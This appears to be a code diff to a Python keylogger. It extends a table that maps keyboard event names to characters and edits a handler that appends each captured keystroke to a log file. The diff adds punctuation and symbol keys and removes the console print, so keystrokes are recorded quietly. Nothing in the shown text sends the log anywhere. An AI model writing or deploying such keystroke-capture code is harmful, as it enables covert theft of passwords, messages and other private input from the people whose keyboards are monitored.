@@ -23,18 +23,34 @@ dic = {"Return":"\\n",
        "parenright":")",
        "bracketleft":"[",
        "bracketright":"]",
+       "braceleft":"{",
+       "braceright":"}",
+       "greater":">",
+       "less":"<",
+       "quotedbl":"\"",
+       "underscore":"_",
+       "question":"?",
+       "comma":",",
+       "numbersign":"#",
+       "dollar":"$",
+       "percent":"%",
+       "ampersand":"&",
+       "apostrophe":"'",
+       "plus":"+",
+       "Shift_R":"",
+       "slash":"/",
+       "backslash":"\\",
        "Control_L":""}
 
 def kbevent(event):
     global msg
 
-    log = open(log_file,'a')
+    log = open(log_file, 'a')
     if event.Key in dic:
         ch = dic[event.Key]
     else:
         ch = event.Key
     msg += ch
-    print(ch)
     log.write(ch + "\n")
 
     # if event.Ascii == 94:
